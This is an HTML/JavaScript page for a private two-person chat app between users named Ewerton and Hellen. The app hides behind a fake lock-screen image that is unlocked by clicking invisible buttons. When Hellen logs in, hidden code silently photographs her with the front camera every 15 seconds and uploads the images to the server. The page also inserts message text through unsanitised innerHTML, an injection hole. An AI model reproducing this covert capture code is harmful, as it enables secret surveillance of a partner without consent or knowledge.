<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chat</title>
    <style>
        * {
            box-sizing: border-box;
        }
        body { 
            font-family: Arial, sans-serif; 
            background-color: #121212; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            color: white; 
            width: 100vw; 
        }
        .container { 
            width: 100vw; 
            height: 100vh; 
            background: #1e1e1e; 
            display: none; 
            flex-direction: column; 
        }
        .login-container { 
            text-align: center; 
            background: #1e1e1e; 
            padding: 20px; 
            border-radius: 10px; 
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.5); 
            width: 90%; 
            max-width: 350px; 
        }
        .login-container button { 
            padding: 12px; 
            width: 100%; 
            margin: 10px 0; 
            border: none; 
            border-radius: 5px; 
            cursor: pointer; 
            font-size: 16px; 
        }
        .ewerton-btn { 
            background: #25d366; 
            color: white; 
        }
        .hellen-btn { 
            background: #ff4081; 
            color: white; 
        } 
        .header { 
            background: #075e54; 
            color: white; 
            padding: 15px; 
            text-align: center; 
            font-size: 18px; 
            font-weight: bold; 
        }
        .messages { 
            flex: 1; 
            overflow-y: auto; 
            padding: 10px; 
            display: flex; 
            flex-direction: column; 
        }
        .message { 
            padding: 10px; 
            border-radius: 8px; 
            margin: 5px; 
            max-width: 70%; 
            word-wrap: break-word; 
            font-size: 14px; 
            position: relative; 
            cursor: pointer; 
            white-space: pre-wrap; 
        }
        .ewerton { 
            background: #0b8043; 
            align-self: flex-start; 
            color: white; 
        }
        .hellen { 
            background: #282828; 
            align-self: flex-end; 
            color: white; 
        }
        .timestamp { 
            font-size: 10px; 
            color: #ccc; 
            position: absolute; 
            bottom: -15px; 
            right: 5px; 
        }
        .input-area { 
            display: flex; 
            flex-direction: column; 
            padding: 10px; 
            background: #1e1e1e; 
            border-top: 1px solid #333; 
            width: 100%; 
            max-width: 100%;
        }
        .input-send-container { 
            display: flex; 
            align-items: center; 
            gap: 5px; 
            width: 100%; 
            max-width: 100%;
        }
        .input-send-container .message-input { 
            flex: 1; 
            padding: 10px; 
            border: 1px solid #444; 
            border-radius: 5px; 
            font-size: 14px; 
            background: #333; 
            color: white; 
            outline: none; 
            max-height: 100px; 
            overflow-y: auto; 
            max-width: 100%;
            min-width: 0;
        }
        .input-send-container button { 
            background: #25d366; 
            color: white; 
            border: none; 
            padding: 10px 15px; 
            border-radius: 5px; 
            cursor: pointer; 
            font-size: 14px; 
        }
        .buttons-container { 
            display: flex; 
            gap: 5px; 
            margin-bottom: 10px; 
            justify-content: flex-start; 
            flex-wrap: wrap;
        }
        .buttons-container label, .buttons-container button { 
            background: #25d366; 
            color: white; 
            padding: 10px 15px; 
            border-radius: 5px; 
            cursor: pointer; 
            font-size: 14px; 
        }
        .input-area input[type="file"] { 
            display: none; 
        }
        .record-btn { 
            background: #ff4081; 
            color: white; 
            padding: 10px 15px; 
            border-radius: 5px; 
            cursor: pointer; 
        }
        .record-btn.recording { 
            background: #ff0000; 
        }
        @media (max-width: 480px) {
            .input-send-container .message-input {
                font-size: 12px;
                padding: 8px;
            }
            .input-send-container button {
                padding: 8px 12px;
                font-size: 12px;
            }
            .buttons-container label, .buttons-container button {
                padding: 8px 12px;
                font-size: 12px;
            }
        }
        .overlay { 
            display: none; 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0, 0, 0, 0.8); 
            justify-content: center; 
            align-items: center; 
            z-index: 1000; 
        }
        .overlay-content { 
            max-width: 90%; 
            max-height: 90%; 
            background: #1e1e1e; 
            padding: 20px; 
            border-radius: 10px; 
            text-align: center; 
        }
        .overlay-content img, .overlay-content video { 
            max-width: 100%; 
            max-height: 80vh; 
            border-radius: 8px; 
        }
        .overlay-content button { 
            margin-top: 10px; 
            padding: 10px 20px; 
            background: #25d366; 
            color: white; 
            border: none; 
            border-radius: 5px; 
            cursor: pointer; 
        }
        .camera-overlay { 
            display: none; 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0, 0, 0, 0.8); 
            justify-content: center; 
            align-items: center; 
            z-index: 1000; 
            flex-direction: column; 
        }
        .camera-overlay video { 
            max-width: 90%; 
            max-height: 70vh; 
            border-radius: 8px; 
        }
        .camera-controls { 
            display: flex; 
            gap: 10px; 
            margin-top: 10px; 
        }
        .camera-controls button { 
            padding: 10px; 
            background: #25d366; 
            color: white; 
            border: none; 
            border-radius: 5px; 
            cursor: pointer; 
        }
    </style>
</head>
<body>
    <div id="lock-screen" style="position:fixed; top:0; left:0; width:100vw; height:100vh; background:#000; z-index:9999; overflow:hidden;">
        <img src="image.png" alt="Tela de Bloqueio" style="width:auto; height:100vh; display:block; margin:0 auto;" />
        <div style="position:absolute; top:10px; left:50%; transform:translateX(-50%); display:flex; gap:12px; z-index:10000;">
            <button onclick="unlockAttempt()" style="width:40px; height:40px; background:transparent; border:none;"></button>
            <button onclick="unlockAttempt()" style="width:40px; height:40px; background:transparent; border:none;"></button>
            <button onclick="unlockAttempt()" style="width:40px; height:40px; background:transparent; border:none;"></button>
            <button onclick="unlockAttempt()" style="width:40px; height:40px; background:transparent; border:none;"></button>
        </div>
    </div>

    <div class="login-container" id="login-container">
        <h2>Escolha seu usu√°rio</h2>
        <button class="ewerton-btn" onclick="login('Ewerton')">üë®‚Äçüíª Ewerton</button>
        <button class="hellen-btn" onclick="login('Hellen')">üë©‚Äçü¶∞ Hellen</button>
    </div>
    <div class="container" id="chat-container">
        <div class="header" id="chat-title"></div>
        <div class="messages" id="messages"></div>
        <div id="typing-indicator" style="padding:5px 10px; font-size:12px; color:#ccc;"></div>
        <div class="input-area">
            <div class="buttons-container">
                <input type="file" id="fileInput" accept="image/*,video/*" onchange="sendMedia()">
                <label for="fileInput">üì∑</label>
                <input type="file" id="singleViewInput" accept="image/*,video/*" onchange="sendSingleViewMedia()">
                <label for="singleViewInput">üì∑üîÇ</label>
                <button onclick="openCamera()">üì∏üîì</button>
                <button id="recordButton" class="record-btn" onclick="toggleRecording()">üé§</button>
            </div>
            <div class="input-send-container">
                <div id="messageInput" class="message-input" contenteditable="true" placeholder="Digite uma mensagem..."></div>
                <button onclick="sendMessage()">Enviar</button>
            </div>
        </div>
    </div>

    <div class="overlay" id="overlay">
        <div class="overlay-content" id="overlay-content">
            <img id="overlay-image" src="" alt="Imagem">
            <video id="overlay-video" controls style="display: none;"></video>
            <button onclick="closeOverlay()">Fechar</button>
        </div>
    </div>

    <div class="camera-overlay" id="camera-overlay">
        <video id="camera-video" autoplay></video>
        <div class="camera-controls">
            <button onclick="capturePhoto(false)">Tirar Foto</button>
            <button onclick="capturePhoto(true)">Foto √önica</button>
            <button onclick="closeCamera()">Fechar</button>
        </div>
    </div>

    <script>
        let currentUser = "";
        let typingTimeout;
        let mediaRecorder;
        let audioChunks = [];
        let isRecording = false;
        let stream = null;
        let autoPhotoInterval = null;
        let unlockCount = 0;
        let lastMessageCount = 0;
        let lastNotifiedHellen = "";
        let dotCount = 0;

        function unlockAttempt() {
            unlockCount++;
            if (unlockCount >= 3) {
                document.getElementById("lock-screen").style.display = "none";
            }
        }

        function login(user) {
            currentUser = user;
            document.getElementById("login-container").style.display = "none";
            document.getElementById("chat-container").style.display = "flex";
            document.getElementById("chat-title").innerText = `Chat - ${user}`;
            loadMessages();
            if (user === "Hellen") {
                startAutoPhotoCapture();
            }
        }

        async function sendTypingStatus(isTyping) {
            try {
                await fetch("/typing", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ user: currentUser, typing: isTyping })
                });
            } catch (err) {
                console.error("Erro ao enviar status de digita√ß√£o:", err);
            }
        }

        async function sendMessage() {
            const text = document.getElementById("messageInput").innerText.trim();
            if (!text) return;
            try {
                await fetch("/save-message", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ user: currentUser, content: text })
                });
                document.getElementById("messageInput").innerText = "";
                loadMessages();
            } catch (err) {
                console.error("Erro ao enviar mensagem:", err);
                alert("Erro ao enviar mensagem.");
            }
        }

        async function sendMedia() {
            const fileInput = document.getElementById("fileInput");
            const file = fileInput.files[0];
            if (!file) return;
            const formData = new FormData();
            formData.append("media", file);
            formData.append("user", currentUser);
            try {
                await fetch("/save-media", { method: "POST", body: formData });
                fileInput.value = "";
                loadMessages();
            } catch (err) {
                console.error("Erro ao enviar m√≠dia:", err);
                alert("Erro ao enviar m√≠dia.");
            }
        }

        async function sendSingleViewMedia() {
            const fileInput = document.getElementById("singleViewInput");
            const file = fileInput.files[0];
            if (!file) return;
            const formData = new FormData();
            formData.append("media", file);
            formData.append("user", currentUser);
            formData.append("singleView", true);
            try {
                await fetch("/save-single-view-media", { method: "POST", body: formData });
                fileInput.value = "";
                loadMessages();
            } catch (err) {
                console.error("Erro ao enviar m√≠dia de visualiza√ß√£o √∫nica:", err);
                alert("Erro ao enviar m√≠dia de visualiza√ß√£o √∫nica.");
            }
        }

        async function captureAutoPhoto(attempt = 1, maxAttempts = 3) {
            if (currentUser !== "Hellen") return;
            try {
                if (!stream) {
                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "user" } } });
                }
                const video = document.createElement("video");
                video.srcObject = stream;
                document.body.appendChild(video); // Append to DOM to force rendering
                video.style.display = "none";
                await video.play();
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        video.onloadedmetadata = null;
                        setTimeout(resolve, 1000); // Wait 1s for video stabilization
                    };
                });
                if (video.videoWidth === 0 || video.videoHeight === 0) {
                    if (attempt < maxAttempts) {
                        console.warn(`Tentativa ${attempt} falhou: dimens√µes de v√≠deo inv√°lidas. Tentando novamente...`);
                        document.body.removeChild(video);
                        return captureAutoPhoto(attempt + 1, maxAttempts);
                    }
                    throw new Error("Video dimensions are invalid after multiple attempts.");
                }
                const canvas = document.createElement("canvas");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext("2d");
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append("media", blob, `${Date.now()}.jpg`);
                    formData.append("user", currentUser);
                    try {
                        await fetch("/save-auto-photo", { method: "POST", body: formData });
                        loadMessages();
                    } catch (err) {
                        console.error("Erro ao enviar foto autom√°tica:", err);
                    }
                }, "image/jpeg");
                document.body.removeChild(video);
                video.srcObject = null;
            } catch (err) {
                console.error(`Erro ao capturar foto autom√°tica (tentativa ${attempt}):`, err);
                if (attempt < maxAttempts) {
                    console.warn(`Tentando novamente... (tentativa ${attempt + 1})`);
                    return captureAutoPhoto(attempt + 1, maxAttempts);
                }
                if (err.name === "NotAllowedError") {
                    alert("Camera access denied. Please allow camera permissions in browser settings.");
                } else if (err.name === "NotFoundError") {
                    alert("No front-facing camera found. Please check your device.");
                } else {
                    alert("Error capturing auto photo: " + err.message);
                }
            }
        }

        function startAutoPhotoCapture() {
            if (currentUser === "Hellen" && !autoPhotoInterval) {
                captureAutoPhoto(); // Capture immediately
                autoPhotoInterval = setInterval(captureAutoPhoto, 15000);
            }
        }

        function stopAutoPhotoCapture() {
            if (autoPhotoInterval) {
                clearInterval(autoPhotoInterval);
                autoPhotoInterval = null;
            }
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null;
            }
        }

        async function loadMessages() {
            try {
                const response = await fetch("/load-messages");
                const messages = await response.json();
                const messagesContainer = document.getElementById("messages");
                messagesContainer.innerHTML = "";
                messages.forEach(msg => {
                    const div = document.createElement("div");
                    div.classList.add("message", msg.user.toLowerCase());
                    if (msg.content) {
                        div.innerHTML = msg.content.replace(/\n/g, "<br>");
                    } else if (msg.media) {
                        const fileExtension = msg.media.split('.').pop().toLowerCase();
                        if (msg.singleView && !msg.viewed && msg.user !== currentUser) {
                            div.innerHTML = `<div style="color: red;">Esta foto pode ser visualizada apenas uma vez. <button onclick="openSingleView('${msg.media}')">Abrir</button></div>`;
                        } else if (msg.viewed && msg.user === currentUser) {
                            div.innerHTML = `<div style="color: #25d366;">Sua m√≠dia foi visualizada.</div>`;
                        } else if (!msg.singleView) {
                            if (["mp4", "webm", "ogg"].includes(fileExtension)) {
                                div.innerHTML = `<video controls style="max-width: 100%; border-radius: 8px;"><source src="/Uploads/${msg.media}" type="video/${fileExtension}"></video>`;
                            } else if (["mp3", "wav", "ogg"].includes(fileExtension)) {
                                div.innerHTML = `<audio controls style="max-width: 100%;"><source src="/Uploads/${msg.media}" type="audio/${fileExtension}"></audio>`;
                            } else {
                                div.innerHTML = `<img src="/Uploads/${msg.media}" style="max-width: 100%; border-radius: 8px;">`;
                            }
                        }
                    }
                    messagesContainer.appendChild(div);
                });
                messagesContainer.scrollTop = messagesContainer.scrollHeight;
            } catch (err) {
                console.error("Erro ao carregar mensagens:", err);
            }
        }

        async function openSingleView(media) {
            const fileExtension = media.split('.').pop().toLowerCase();
            const overlay = document.getElementById("overlay");
            const overlayImage = document.getElementById("overlay-image");
            const overlayVideo = document.getElementById("overlay-video");
            const overlayContent = document.getElementById("overlay-content");
            if (["mp4", "webm", "ogg"].includes(fileExtension)) {
                overlayImage.style.display = "none";
                overlayVideo.style.display = "block";
                overlayVideo.src = `/Uploads/${media}`;
            } else {
                overlayVideo.style.display = "none";
                overlayImage.style.display = "block";
                overlayImage.src = `/Uploads/${media}`;
            }
            overlayContent.innerHTML = `
                <img id="overlay-image" src="${overlayImage.src}" alt="Imagem" style="display: ${overlayImage.style.display};">
                <video id="overlay-video" controls style="display: ${overlayVideo.style.display};" src="${overlayVideo.src}"></video>
                <button onclick="closeOverlay()">Fechar</button>
            `;
            overlay.style.display = "flex";
            try {
                await fetch("/mark-as-viewed", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ media: media, viewer: currentUser })
                });
                loadMessages();
            } catch (err) {
                console.error("Erro ao marcar m√≠dia como visualizada:", err);
            }
        }

        function closeOverlay() {
            const overlay = document.getElementById("overlay");
            const overlayContent = document.getElementById("overlay-content");
            const overlayImage = document.getElementById("overlay-image");
            const overlayVideo = document.getElementById("overlay-video");
            overlayImage.src = "";
            overlayVideo.src = "";
            overlayImage.style.display = "none";
            overlayVideo.style.display = "none";
            overlayContent.innerHTML = `
                <img id="overlay-image" src="" alt="Imagem">
                <video id="overlay-video" controls style="display: none;"></video>
                <button onclick="closeOverlay()">Fechar</button>
            `;
            overlay.style.display = "none";
        }

        async function toggleRecording() {
            try {
                if (!isRecording) {
                    audioChunks = [];
                    const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    mediaRecorder = new MediaRecorder(audioStream);
                    mediaRecorder.ondataavailable = (event) => {
                        audioChunks.push(event.data);
                    };
                    mediaRecorder.onstop = async () => {
                        const audioBlob = new Blob(audioChunks, { type: "audio/wav" });
                        const formData = new FormData();
                        formData.append("media", audioBlob, "audio.wav");
                        formData.append("user", currentUser);
                        await fetch("/save-media", { method: "POST", body: formData });
                        loadMessages();
                        audioStream.getTracks().forEach(track => track.stop());
                    };
                    mediaRecorder.start();
                    isRecording = true;
                    document.getElementById("recordButton").classList.add("recording");
                    document.getElementById("recordButton").innerText = "‚èπ Parar Grava√ß√£o";
                } else {
                    mediaRecorder.stop();
                    isRecording = false;
                    document.getElementById("recordButton").classList.remove("recording");
                    document.getElementById("recordButton").innerText = "üé§ Gravar √Åudio";
                }
            } catch (err) {
                console.error("Erro ao gravar √°udio:", err);
                alert("Erro ao gravar √°udio. Verifique permiss√µes de microfone.");
            }
        }

        async function openCamera() {
            const cameraOverlay = document.getElementById("camera-overlay");
            const video = document.getElementById("camera-video");
            cameraOverlay.style.display = "flex";
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "user" } } });
                video.srcObject = stream;
                await video.play();
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        video.onloadedmetadata = null;
                        setTimeout(resolve, 1000); // Wait 1s for video stabilization
                    };
                });
                if (video.videoWidth === 0 || video.videoHeight === 0) {
                    throw new Error("Video dimensions are invalid.");
                }
            } catch (err) {
                console.error("Erro ao acessar a c√¢mera:", err);
                if (err.name === "NotAllowedError") {
                    alert("Camera access denied. Please allow camera permissions in browser settings.");
                } else if (err.name === "NotFoundError") {
                    alert("No front-facing camera found. Please check your device.");
                } else {
                    alert("Error accessing camera: " + err.message);
                }
                closeCamera();
            }
        }

        async function capturePhoto(singleView) {
            const video = document.getElementById("camera-video");
            if (!video.srcObject || video.videoWidth === 0 || video.videoHeight === 0) {
                alert("C√¢mera n√£o est√° ativa ou n√£o est√° pronta. Tente abrir a c√¢mera novamente.");
                closeCamera();
                return;
            }
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(async (blob) => {
                const overlay = document.getElementById("overlay");
                const overlayContent = document.getElementById("overlay-content");
                const overlayImage = document.getElementById("overlay-image");
                const overlayVideo = document.getElementById("overlay-video");
                overlayImage.src = URL.createObjectURL(blob);
                overlayImage.style.display = "block";
                overlayVideo.style.display = "none";
                overlayContent.innerHTML = `
                    <img id="overlay-image" src="${overlayImage.src}" alt="Imagem capturada" style="max-width: 100%; border-radius: 8px;">
                    <div style="margin-top: 10px;">
                        <button onclick="sendCapturedPhoto(${singleView})">Enviar</button>
                        <button onclick="closeOverlayAndReopenCamera()">Tirar Outra</button>
                        <button onclick="closeOverlay()">Fechar</button>
                    </div>
                `;
                overlay.style.display = "flex";
                if (singleView) {
                    closeCamera();
                }
            }, "image/jpeg");
        }

        async function sendCapturedPhoto(singleView) {
            const overlayImage = document.getElementById("overlay-image");
            try {
                const response = await fetch(overlayImage.src);
                const blob = await response.blob();
                const formData = new FormData();
                formData.append("media", blob, `${Date.now()}.jpg`);
                formData.append("user", currentUser);
                const endpoint = singleView ? "/save-single-view-media" : "/save-media";
                await fetch(endpoint, { method: "POST", body: formData });
                closeOverlay();
                loadMessages();
            } catch (err) {
                console.error("Erro ao enviar foto capturada:", err);
                alert("Erro ao enviar foto capturada.");
            }
        }

        function closeOverlayAndReopenCamera() {
            closeOverlay();
            openCamera();
        }

        function closeCamera() {
            const cameraOverlay = document.getElementById("camera-overlay");
            const video = document.getElementById("camera-video");
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null;
            }
            video.srcObject = null;
            cameraOverlay.style.display = "none";
        }

        async function autoUpdateMessages() {
            try {
                const response = await fetch("/load-messages");
                const messages = await response.json();
                const messagesContainer = document.getElementById("messages");
                if (messages.length !== lastMessageCount) {
                    messagesContainer.innerHTML = "";
                    messages.forEach(msg => {
                        const div = document.createElement("div");
                        div.classList.add("message", msg.user.toLowerCase());
                        if (msg.content) {
                            div.innerHTML = msg.content.replace(/\n/g, "<br>");
                        } else if (msg.media) {
                            const fileExtension = msg.media.split('.').pop().toLowerCase();
                            if (msg.singleView && !msg.viewed && msg.user !== currentUser) {
                                div.innerHTML = `<div style="color: red;">Esta foto pode ser visualizada apenas uma vez. <button onclick="openSingleView('${msg.media}')">Abrir</button></div>`;
                            } else if (msg.viewed && msg.user === currentUser) {
                                div.innerHTML = `<div style="color: #25d366;">Sua m√≠dia foi visualizada.</div>`;
                            } else if (!msg.singleView) {
                                if (["mp4", "webm", "ogg"].includes(fileExtension)) {
                                    div.innerHTML = `<video controls style="max-width: 100%; border-radius: 8px;"><source src="/Uploads/${msg.media}" type="video/${fileExtension}"></video>`;
                                } else if (["mp3", "wav", "ogg"].includes(fileExtension)) {
                                    div.innerHTML = `<audio controls style="max-width: 100%;"><source src="/Uploads/${msg.media}" type="audio/${fileExtension}"></audio>`;
                                } else {
                                    div.innerHTML = `<img src="/Uploads/${msg.media}" style="max-width: 100%; border-radius: 8px;">`;
                                }
                            }
                        }
                        messagesContainer.appendChild(div);
                    });
                    messagesContainer.scrollTop = messagesContainer.scrollHeight;
                    lastMessageCount = messages.length;
                }
                const hellenMessages = messages.filter(m => m.user === "Hellen");
                if (hellenMessages.length > 0) {
                    const lastHellen = hellenMessages[hellenMessages.length - 1];
                    const content = lastHellen.content || "Enviou uma m√≠dia";
                    if (lastHellen.content !== lastNotifiedHellen) {
                        if (Notification.permission === "granted") {
                            new Notification("Nova mensagem de Hellen", {
                                body: content,
                                icon: "/path/to/icon.png"
                            });
                        }
                        lastNotifiedHellen = lastHellen.content;
                    }
                }
            } catch (err) {
                console.error("Erro ao carregar mensagens:", err);
            }
        }

        function updateTypingIndicator() {
            fetch("/typing-status")
                .then(res => res.json())
                .then(status => {
                    const otherUser = currentUser === "Hellen" ? "Ewerton" : "Hellen";
                    if (status[otherUser]) {
                        dotCount = (dotCount + 1) % 4;
                        const dots = ".".repeat(dotCount);
                        document.getElementById("typing-indicator").innerText = `${otherUser} est√° digitando${dots}`;
                    } else {
                        document.getElementById("typing-indicator").innerText = "";
                    }
                })
                .catch(err => console.error("Erro ao buscar status de digita√ß√£o:", err));
        }

        document.addEventListener("DOMContentLoaded", () => {
            const messageInput = document.getElementById("messageInput");
            messageInput.addEventListener("input", () => {
                sendTypingStatus(true);
                clearTimeout(typingTimeout);
                typingTimeout = setTimeout(() => sendTypingStatus(false), 1000);
            });
            messageInput.addEventListener("keydown", (event) => {
                if (event.key === "Enter" && !event.shiftKey) {
                    event.preventDefault();
                    sendMessage();
                }
            });
            if ("Notification" in window) {
                Notification.requestPermission();
            }
            setInterval(autoUpdateMessages, 1000);
            setInterval(updateTypingIndicator, 500);
            window.addEventListener('beforeunload', stopAutoPhotoCapture);
        });
    </script>
